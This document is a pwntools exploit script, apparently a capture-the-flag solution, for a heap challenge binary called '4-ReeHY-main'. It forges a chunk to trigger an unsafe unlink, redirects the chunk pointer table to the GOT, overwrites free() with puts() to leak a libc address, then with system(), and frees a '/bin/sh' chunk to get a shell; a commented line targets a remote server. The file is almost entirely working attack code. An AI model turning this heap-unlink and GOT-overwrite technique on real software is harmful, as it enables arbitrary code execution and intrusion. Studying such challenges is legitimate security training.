from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

# libc = ELF('../file/ctflibc.so.6')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc_atoi_addr = libc.symbols['atoi']
libc_sys_addr = libc.symbols['system']
libc_write_addr = libc.symbols['write']

print(hex(libc_atoi_addr))
print(hex(libc_sys_addr))

chunk_addr_bss = 0x6020E0

elf = ELF('../file/4-ReeHY-main')
io = process('../file/4-ReeHY-main')
# io = remote('61.147.171.105', '56594')

pause()

def create(size, index, content):
    io.sendlineafter(b'$ ', b'1')
    io.sendlineafter(b'Input size\n', str(size).encode())
    io.sendlineafter(b'Input cun\n', str(index).encode())
    io.sendafter(b'Input content\n', content)

def delete(index):
    io.sendlineafter(b'$ ', b'2')
    io.sendlineafter(b'Chose one to dele\n', str(index).encode())

def edit(index, content):
    io.sendlineafter(b'$ ', b'3')
    io.sendlineafter(b'Chose one to edit\n', str(index).encode())
    io.sendafter(b'Input the content\n', content)

main_addr = 0x400C8C
pop_rdi_ret_addr = 0x400DA3
one_gadget_addr = 0x41EBC

io.recv()
io.sendline(b'CoLin')

create(0x420, 0, b'flag')
create(0x420, 1, b'flag')
delete(1)
delete(0)

payload = p64(0)        # fake chunk prev_size
payload += p64(0x420)   # fake chunk size
payload += p64(chunk_addr_bss - 0x18)   # fake chunk fd
payload += p64(chunk_addr_bss - 0x10)   # fake chunk_bk
payload += b'\x00' * 0x400  # useless filling data

payload += p64(0x420)   # front chunk prev_size (modified)
payload += p64(0x420)   # front size (modified)
payload += b'\x00' * 0x410  # useless filling data for front chunk

payload += p64(0x420)   # fake front-front chunk prev_size 
payload += p64(0x21)    # fake front-front chunk size with prev_inuse = true
create(0x860, 0, payload)

# 因为偏移为1的地方prev_inuse为false，上一个0x420会被合并进来
# unlink_chunk的操作顺序为fd->bk = bk; bk->fd=fd;
delete(1)               # trigger unlink_chunk(av, p)

# now the address of chunk_0 (0x6020e0) has been changed into 0x6020c8, we can edit the next chunk into .got.plt

payload = b'\x00' * 0x18    # useless data for filling
payload += p64(0x6020c8)    # chunk_0 address
payload += p64(1)           # chunk_0 inuse
payload += p64(0x602018)    # change the chunk_1 to .got.plt of free()
payload += p64(1)           # change chunk_1 into inuse
payload += p64(0x602028)    # the .got.plt of write, ready to be used to get libc loading address
payload += p64(1)           # set the chunk_2 into inuse for free()

edit(0, payload)

edit(1, p64(elf.plt['puts']))       # change the address, now free() equals puts()

delete(2)

mem_write_addr = u64(io.recv(6) + b'\x00\x00')  # get the write() address in memory

libc_base = mem_write_addr - libc_write_addr    # libc loading base
mem_sys_addr = libc_base + libc_sys_addr        # system() address in memory

# libc = LibcSearcher('write', mem_write_addr)
# libc_base = mem_write_addr - libc.dump('write')
# mem_sys_addr = libc_base + libc.dump('system')

edit(1, p64(mem_sys_addr))          # now free() equals system()

create(0x20, 3, b'/bin/sh')
delete(3)

io.interactive()
